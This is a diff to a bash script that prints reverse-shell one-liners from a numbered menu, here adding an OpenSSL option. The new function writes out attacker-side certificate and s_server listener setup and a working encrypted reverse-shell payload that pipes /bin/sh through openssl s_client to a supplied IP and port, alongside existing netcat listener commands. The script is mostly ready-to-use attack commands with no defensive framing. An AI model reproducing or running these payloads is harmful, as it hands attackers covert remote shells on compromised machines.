@@ -53,7 +53,7 @@ function reverse_shell_list(){
 
 [${Cyan}9${Color_Off}]Lua           [${Blue}10${Color_Off}]Powershell
 
-[${Green}11${Color_Off}]Telnet
+[${Green}11${Color_Off}]Telnet       [${Yellow}12${Color_Off}]Open_ssl
 
 	"""
     while true;do
@@ -70,8 +70,9 @@ function reverse_shell_list(){
 	    7) php_shell;;
 	    8) shellshock;;
 	    9) lua_shell;;
-	   10) powershell;;
-           11) telnet;;
+	    10) powershell;;
+        11) telnet;;
+		12) open_ssl;;
 	   "exit"|"q"|"quit") exit 0;;
 	   *)echo -e "[-]Enter the shell number";reverse_shell_list;;
 	esac
@@ -154,6 +155,13 @@ function telnet(){
     echo -e "[${Red}*${Color_Off}]Set two listeners:
    [${Red}Input${Color_Off}]  nc -lnvvp ${Red}$port${Color_Off}
    [${Green}Output${Color_Off}] nc -lnvvp ${Red}9999${Color_Off}"
+}
+
+function open_ssl(){
+	echo -e "${pos}${Yellow}Open_ssl Reverse Shell:"
+	echo -e "${Color_Off}${Green}On the attacker box: ${Color_Off}openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
+	echo -e "${Green}On The attacking machine:${Color_Off}openssl s_server -quiet -key key.pem -cert cert.pem -port ${Red}$port${Color_Off}"
+	echo -e "${Green}Reverse Shell:${Color_Off}mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${Red}$ipaddr${Color_Off}:${Red}$port${Color_Off} > /tmp/s; rm /tmp/s"
 }
 
 ipaddr=$1
